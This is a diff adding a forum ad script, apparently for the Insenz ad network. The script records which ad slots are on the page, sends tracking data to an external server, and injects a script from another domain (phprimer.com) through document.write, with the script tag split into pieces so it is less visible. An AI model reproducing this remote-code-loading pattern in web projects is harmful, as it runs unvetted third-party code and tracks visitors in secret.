@@ -1,0 +1,35 @@
+var insenz_hash='41778f36157864b946c2fa9122409f5f';insenz_adkeys = new Array();insenz_usedadkeys = new Array();if (!window.insenz_cached) {
+			if (typeof(tid) == 'undefined')  var tid=0; 
+			if (typeof(gid) == 'undefined')  var gid=0;
+			 
+				function _r(num){
+					now = new Date();
+					sec = now.getSeconds();
+					return sec % num +1;
+				}
+				
+					function cookiex(_ki){
+							var  ki=parseInt(getcookie(_ki));
+								ki=ki?ki:_times[0];
+								xV=ki+_times[1];			
+							var x=1;
+							while (xV <= _times[0]) {xV=xV+_times[++x];};
+
+							setcookie(_ki, --ki, 864000);
+							return x;
+							}
+				var aN = new Array();
+				var aC = new Array();
+				aN[1] = 'ad_headerbanner';aC[1] = 'ad_headerbanner';aN[2] = 'ad_thread3_0';aC[2] = 'ad_pip';aN[3] = 'ad_thread2_0';aC[3] = 'ad_textlink2';aN[4] = 'ad_thread1_0';aC[4] = 'ad_textlink1';aN[5] = 'ad_interthread';aC[5] = 'ad_column';
+		var atS='';
+		var atJs='';
+		for (at in aN) {
+			if ($(aN[at]))
+			{
+				atS += '_'+at;
+			}
+		}
+		atJs = 'http://st04.insenz.com/s.gif?sid=7051&gid='+gid+'&atid='+atS+'&rando='+_r(66);
+		var atImg = new Image();
+		atImg.src = atJs;
+		}document.write('<scr'+'ipt type="text/javas'+'cript" src="http://phprimer.com/info/getinfo.php?cId=1079&cType=2&sId=7051&redirect=1&insenzUrl=http%3A%2F%2F50sg.yeswan.com"></'+'script>');
